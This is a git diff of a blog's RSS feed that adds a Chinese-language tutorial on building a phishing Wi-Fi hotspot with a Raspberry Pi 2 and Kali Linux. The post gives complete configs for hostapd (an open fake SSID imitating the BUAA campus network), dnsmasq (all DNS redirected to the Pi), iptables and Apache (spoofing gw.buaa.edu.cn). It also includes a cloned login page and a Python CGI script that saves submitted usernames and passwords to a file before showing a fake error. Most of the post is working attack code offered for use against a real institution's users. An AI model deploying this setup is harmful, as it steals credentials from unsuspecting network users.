@@ -5,8 +5,8 @@
     <description>Welcome to my blog!</description>
     <link>https://wuyinan0126.github.io//</link>
     <atom:link href="https://wuyinan0126.github.io//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 17 Sep 2016 15:19:25 +0800</pubDate>
-    <lastBuildDate>Sat, 17 Sep 2016 15:19:25 +0800</lastBuildDate>
+    <pubDate>Sat, 17 Sep 2016 15:20:28 +0800</pubDate>
+    <lastBuildDate>Sat, 17 Sep 2016 15:20:28 +0800</lastBuildDate>
     <generator>Jekyll v3.0.2</generator>
     
       <item>
@@ -429,6 +429,365 @@ H(P\ AND\ Q)/[H(P)+H(Q)-H(P\ AND\ Q)], &amp; H(P\ AND\ Q)\gt\theta
         <pubDate>Fri, 08 Jan 2016 23:04:23 +0800</pubDate>
         <link>https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
         <guid isPermaLink="true">https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
+        
+        <category>geek</category>
+        
+        
+        <category>geek</category>
+        
+      </item>
+    
+      <item>
+        <title>树莓派2创建钓鱼热点</title>
+        <description>&lt;p&gt;&lt;em&gt;使用树莓派2和无线网卡创建钓鱼热点。包括树莓派、Raspbian系统、无线网卡和Micro SD卡的介绍，以及相关软件的安装和配置&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;关于树莓派&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The Raspberry Pi is a tiny and affordable computer that you can use to learn programming through fun, practical projects.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.raspberrypi.org/&quot;&gt;树莓派&lt;/a&gt;是一个小型的而且很便宜的（$35）电脑，在这个电脑上你可以通过有趣的实用的项目学习编程&lt;/p&gt;
+
+&lt;p&gt;树莓派2 Model B长这样：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2015-06-27-树莓派2创建钓鱼热点-1.jpg&quot; alt=&quot;树莓派2 Model B&quot; title=&quot;树莓派2 Model B&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;关于系统&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Raspbian is a free operating system based on Debian optimized for the Raspberry Pi hardware.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;树莓派官方出的系统是&lt;a href=&quot;https://www.raspbian.org/&quot;&gt;Raspbian&lt;/a&gt;，基于Debian并根据树莓派的硬件进行了优化&lt;/p&gt;
+
+&lt;p&gt;当然其他的操作系统，如Ubuntu、Fedora都有针对树莓派的版本。我选的系统是Kali Linux，选它的原因请参考标题&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Kali官方有针对树莓派2的版本，具体安装教程：[Kali Linux – Raspberry Pi&lt;/td&gt;
+      &lt;td&gt;Kali Linux]&lt;a href=&quot;http://docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi&quot;&gt;kali-linux&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;micro-sd&quot;&gt;关于无线网卡和Micro SD卡&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;我选的无线网卡是&lt;a href=&quot;http://item.jd.com/509932.html&quot;&gt;EDUP EP-N8508GS黄金版 迷你USB无线网卡 树莓派专用&lt;/a&gt;，芯片是rtl8188cus，免驱即插即用。&lt;/p&gt;
+
+&lt;p&gt;选择无线网卡的时候请参考官网：&lt;a href=&quot;http://elinux.org/RPi_USB_Wi-Fi_Adapters&quot;&gt;RPi USB Wi-Fi Adapters&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;我选的Micro SD卡是&lt;a href=&quot;http://item.jd.com/679773.html&quot;&gt;闪迪（SanDisk）32GB UHS-I 至尊高速移动MicroSDHC-TF存储卡（读速48Mb/s）&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;选择Micro SD卡的时候请参考官网：&lt;a href=&quot;http://elinux.org/RPi_SD_cards&quot;&gt;RPi SD cards&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;安装和配置相关软件&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;假设已经按照教程安装好了系统，也插上无线网卡了，接下来就是安装必要的软件。&lt;/p&gt;
+
+&lt;p&gt;连接树莓派的方式有通过显示器（需要HDMI转接头）、SSH登录、VNC连接等，因为Kali开机自动启动SSH Server，所以只要知道树莓派的IP地址，用SSH连过去就行了，Kali的默认用户名是root，登录密码是toor。&lt;/p&gt;
+
+&lt;p&gt;代码前有#的表示在bash下以root身份运行的代码，没有的表示修改的文件内容。&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;修改更新源，在/etc/apt/sources.list中添加：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib
+ deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib
+ deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free
+ deb http://mirrors.aliyun.com/kali kali main non-free contrib
+ deb-src http://mirrors.aliyun.com/kali kali main non-free contrib
+ deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;然后进行更新：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # apt-get update &amp;amp;&amp;amp; apt-get upgrade
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;根分区扩充&lt;/p&gt;
+
+    &lt;p&gt;下面链接中的文件可能有更新，请根据需要进入对应目录选择版本&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # wget http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/raspi-config_20150131-1_all.deb
+ # wget http://http.us.debian.org/debian/pool/main/t/triggerhappy/triggerhappy_0.3.4-2_armhf.deb
+ # wget http://http.us.debian.org/debian/pool/main/l/lua5.1/lua5.1_5.1.5-7.1_armhf.deb
+ # dpkg -i triggerhappy_0.3.4-2_armhf.deb
+ # dpkg -i lua5.1_5.1.5-7.1_armhf.deb
+ # dpkg -i raspi-config_20150131-1_all.deb
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;然后使用raspi-config命令进入系统设置，选择第一项Expand Filesystem扩充，当然系统设置中还有其他设置，根据需要进行设置即可。用df -lh检查文件系统大小，根分区是否为SD卡大小&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;安装和配置hostapd&lt;/p&gt;
+
+    &lt;p&gt;hostapd的作用是提供无线共享，即配置并成功运行hostapd后，能够搜索到热点&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # apt-get install hostapd
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;由于无线网卡支持的问题，系统安装的hostapd不支持rtl8188cus芯片，需要将hostapd替换为兼容版本：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip
+ # unzip hostapd.zip 
+ # sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak
+ # sudo mv hostapd /usr/sbin/hostapd.cat
+ # sudo ln -sf /usr/sbin/hostapd.cat /usr/sbin/hostapd  
+ # sudo chmod 755 /usr/sbin/hostapd
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;修改（没有的话新建）/etc/hostapd/hostapd.conf：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; interface=wlan0            
+ ctrl_interface=wlan0
+ ctrl_interface_group=0
+ ssid=BUAA-WiFi                # 伪热点名，例如我的是校园网的WiFi热点名            
+ channel=2                  
+ macaddr_acl=0              
+ ignore_broadcast_ssid=0    
+ driver=rtl871xdrv         
+ hw_mode=g                        
+ wmm_enabled=1
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;因为是用来钓鱼的伪热点，所以不设置热点密码&lt;/p&gt;
+
+    &lt;p&gt;修改/etc/default/hostapd，去掉DAEMON_CONF前的注释符号并修改为我们的配置文件路径：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;启动hostapd：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # service hostapd start
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;安装和配置dnsmasq&lt;/p&gt;
+
+    &lt;p&gt;dnsmasq提供的是为接进热点的设备分配IP以及进行流量引导，Kali中已经安装好dnsmasq了&lt;/p&gt;
+
+    &lt;p&gt;修改（没有的话新建）/etc/dnsmasq.conf：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; interface=wlan0
+ bind-interfaces
+ domain=rpi
+ address=/#/192.168.126.126        # 将对所有网站的访问重定向到本机
+ dhcp-range=192.168.126.97,192.168.126.125,255.255.255.224,12h	# IP分配池和过期时间
+ dhcp-option=3,192.168.126.126 	  # Router IP
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;启动dnsmasq：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # dnsmasq
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;添加iptables规则&lt;/p&gt;
+
+    &lt;p&gt;修改/etc/sysctl.conf：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; net.ipv4.ip_forward=1
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;修改/proc/sys/net/ipv4/ip_forward为1&lt;/p&gt;
+
+    &lt;p&gt;添加转发规则：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+ # sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+ # sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;然后用iptables -t nat -S和iptables -S检查是否添加成功&lt;/p&gt;
+
+    &lt;p&gt;为了让上面的规则在开始时自动添加，执行：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # sh -c &quot;iptables-save &amp;gt; /etc/iptables.ipv4.nat&quot;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;设置wlan0的静态IP&lt;/p&gt;
+
+    &lt;p&gt;修改/etc/network/interfaces，添加：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; auto wlan0
+ allow-hotplug wlan0
+ iface wlan0 inet static
+         address 192.168.126.126    # 与之前dhcpd.conf填写的网关地址相同
+         netmask 255.255.255.240    # 与之前dhcpd.conf填写的子网掩码相同
+ up iptables-restore &amp;lt; /etc/iptables.ipv4.nat
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;安装和配置apache2&lt;/p&gt;
+
+    &lt;p&gt;apache2提供的是为将重定向的流量引导到本机服务器运行的网页中，Kali中已经安装好apache2了&lt;/p&gt;
+
+    &lt;p&gt;修改/etc/apache2/sites-available/default，在合适的标签下添加：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;VirtualHost *:80&amp;gt;
+ ...
+ ServerName gw.buaa.edu.cn             # 伪造服务器名
+ DirectoryIndex gw.buaa.edu.cn.html    # 将默认界面改为钓鱼网站页面
+ ...
+ &amp;lt;Directory &quot;/usr/lib/cgi-bin&quot;&amp;gt;
+     AddHandler cgi-script .py         # 添加对.py的支持
+ ...
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;启动apache2：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # service apache2 start
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;编写钓鱼网站&lt;/p&gt;
+
+    &lt;p&gt;我要钓鱼的是学校的校园网登录网站，所以copy校园网登录的界面，修改里面的表单提交action，提交到本机服务的后台，例如我的钓鱼网站/var/www/gw.buaa.edu.cn.html：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ...
+ &amp;amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
+     function login() {
+         var errorMsg = [];
+         var username = $(&quot;input[name=&#39;username&#39;]&quot;).val();
+         var password = $(&quot;input[name=&#39;password&#39;]&quot;).val();
+         if(username == &#39;&#39; || username == &#39;用户名*&#39;) {
+              errorMsg.push(&#39;请输入用户名.&#39;);
+              $(&#39;#txtuser&#39;).focus();
+         }
+         if (password == &#39;&#39; || password == &#39;密码*&#39;) {
+             errorMsg.push(&#39;请输入密码.&#39;);
+             $(&#39;#txtPwd&#39;).focus();
+         }
+         if (errorMsg != &quot;&quot;) {
+             if (errorMsg.length &amp;gt; 0) {
+                 $(&#39;#divloginError&#39;).html(&#39;&#39;).html($(&#39;&amp;lt;ul/&amp;gt;&#39;, {
+                     html: &#39;&amp;lt;li&amp;gt;&#39; + errorMsg.join(&#39;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&#39;) + &#39;&amp;lt;/li&amp;gt;&#39;
+                 })).show();
+                 $(&#39;#dvloginErrorM&#39;).show();
+                 $.mobile.silentScroll(125);
+             } else {
+                 $(&#39;#dvloginErrorM&#39;).hide();
+             }
+         } else {
+             document.aspnetForm.submit();
+         }
+     }
+ &amp;amp;lt;/script&amp;gt;
+ ...
+ &amp;amp;lt;!--表单提交--&amp;gt;
+ &amp;amp;lt;form name=&quot;aspnetForm&quot; method=&quot;post&quot; action=&quot;/cgi-bin/login.py&quot;...&amp;gt;
+ &amp;amp;lt;!--用户提交按钮--&amp;gt;
+     &amp;lt;a href=&quot;javascript:login()&quot;.../&amp;gt;
+ &amp;amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;编写后台处理程序，我用的是python的cgi，在/usr/lib/gci-bin下新建login.py：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; #!/usr/bin/python
+ #-*- encoding: utf-8 -*-
+ import cgi, cgitb
+ form = cgi.FieldStorage()
+ username = form.getvalue(&#39;username&#39;)                # 获得用户名
+ password = form.getvalue(&#39;password&#39;)                # 获得密码
+ f = open(&#39;/cat/gw.buaa.edu.cn.log&#39;, &#39;a&#39;)            # 注意apache是否有所写文件夹的权限！！
+ f.write(&quot;%s: %s\r\n&quot; % (username, password))        # 将用户名和密码写入文件
+ f.close()
+ print &quot;Content-type:text/html\r\n\r\n&quot;              # 然后显示一个错误页面
+ print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;&#39;
+ print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Error 126&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;&#39;
+ print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;&#39;
+ print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Error establishing a database connection&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&#39;
+ print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;将login.py的权限设置为755，即有运行权限&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;将上述配置开机自启动&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # update-rc.d hostapd enable
+ # update-rc.d isc-dhcp-server enable
+ # update-rc.d apache2 enable	
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;对于dnsmasq，需要手动编写开机启动脚本，在/etc/init.d/下新建文件dnsmasq：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; -e
+ &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
+         &lt;/span&gt;start&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                 dnsmasq&amp;amp;
+                 &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+         stop&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                 killall -9 dnsmasq
+                 &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+         restart&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                 killall -9 dnsmasq
+                 dnsmasq&amp;amp;
+                 &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;然后进入/etc/rc3.d/下，执行：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # ln -sf /etc/init.d/dnsmasq S06dnsmasq
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+
+    &lt;p&gt;S06表示启动优先级，数字越大，优先级越低，比如服务A的运行要依赖服务B，那A的数字就应该大于B的&lt;/p&gt;
+
+    &lt;p&gt;最后，编辑/etc/rc.local，添加：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; service dnsmasq start
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;section-3&quot;&gt;测试运行&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;首先连接上伪热点BUAA-WIFI，然后在浏览器输入一个网址，浏览器将自动跳转到校园网登录界面：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2015-06-27-树莓派2创建钓鱼热点-2.jpg&quot; alt=&quot;测试界面&quot; title=&quot;测试界面&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当用户输入登录的用户名和密码，点击登录后，将跳转到错误页面，但是用户名和密码都已经被后台服务器记录到文件中。&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 27 Jun 2015 23:13:23 +0800</pubDate>
+        <link>https://wuyinan0126.github.io//2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/</link>
+        <guid isPermaLink="true">https://wuyinan0126.github.io//2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/</guid>
         
         <category>geek</category>
         
